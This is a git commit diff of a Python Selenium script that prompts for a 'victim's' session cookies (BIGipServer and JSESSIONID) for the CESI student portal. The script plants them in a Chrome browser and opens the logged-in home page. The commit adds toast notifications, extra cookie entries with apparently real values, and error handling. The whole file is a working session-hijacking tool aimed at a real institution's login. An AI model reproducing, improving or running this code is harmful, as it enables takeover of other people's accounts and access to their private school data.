a170d19c8d6cba611c7601ee1684ae654ac4ae96
the aypisam fpv <the.aypisam.64@gmail.com>
2024-01-10 12:13:41 +0100

    added windows notification
    reformating

--- browser.py
+++ browser.py
@@ -1,4 +1,7 @@
 from selenium import webdriver
+from win10toast import ToastNotifier
+
+toast = ToastNotifier()
 
 
 ent_cookies = [
@@ -19,6 +22,26 @@ ent_cookies = [
         'sameSite': 'Lax',
         'secure': True,
         'value': 'D79FC9A63135FE00021A7540E5B0C029'
+    },
+    {
+        'domain': '.wayf.cesi.fr',
+        'expiry': 1738758386,
+        'httpOnly': False,
+        'name': '_pk_id.9.5fe9',
+        'path': '/',
+        'sameSite': 'Lax',
+        'secure': True,
+        'value': 'e4b2552385498fe8.1704803186.'
+    },
+    {
+        'domain': '.wayf.cesi.fr',
+        'expiry': 1704804986,
+        'httpOnly': False,
+        'name': '_pk_ses.9.5fe9',
+        'path': '/',
+        'sameSite': 'Lax',
+        'secure': True,
+        'value': '1'
     }
 ]
 
@@ -27,24 +50,53 @@ ent_accueil_url = "https://ent.cesi.fr/accueil-apprenant"
 
 
 print("please enter victim's cookies : ")
+toast.show_toast(
+    "Please enter victim's cookies",
+    duration = 2,
+    threaded = True,
+)
+
+
 BIGipServer = input("BIGipServer~ADMIN~pool-WAYF-https > ").replace(' ', '')
 JSESSIONID = input("JSESSIONID > ").replace(' ', '')
 
-print("Launching browser...")
-# Open a driver, get a page, save cookies
+
+
+print("🚀 | Launching browser...")
 driver = webdriver.Chrome()
-driver.get(ent_url)
-default_cookies = driver.get_cookies()
-print(default_cookies)
-# replace the values
+print("✅ | Browser launched !\n")
+
+
+
+
+print("🔁 | Setting cookies...")
+
 driver.delete_all_cookies()
-for cookie in default_cookies:
+good = True
+for cookie in ent_cookies:
     if cookie['name'] == 'BIGipServer~ADMIN~pool-WAYF-https':
         cookie['value'] = BIGipServer
     elif cookie['name'] == 'JSESSIONID':
         cookie['value'] = JSESSIONID
+    else:
+        continue
+    
+    try:
+        driver.add_cookie(cookie)
+        print(f"\t🆗 | Cookie {cookie['name']} set to {cookie['value']}")
+    except Exception as e:
+        print(f"\t❌ | Error while setting cookie {cookie['name']} : {e}")
+        good = False
+    
 
-    driver.add_cookie(cookie)
+if good : print("✅ | Cookies set !\n\t", driver.get_cookies())
+else :
+    print("❌ | Error while setting cookies !")
+    toast.show_toast(
+        "❌ | Error while setting cookies !",
+        "Please check your cookies and try again.",
+        threaded = True,
+    )
 
-print(driver.get_cookies())
+
 driver.get(ent_accueil_url)
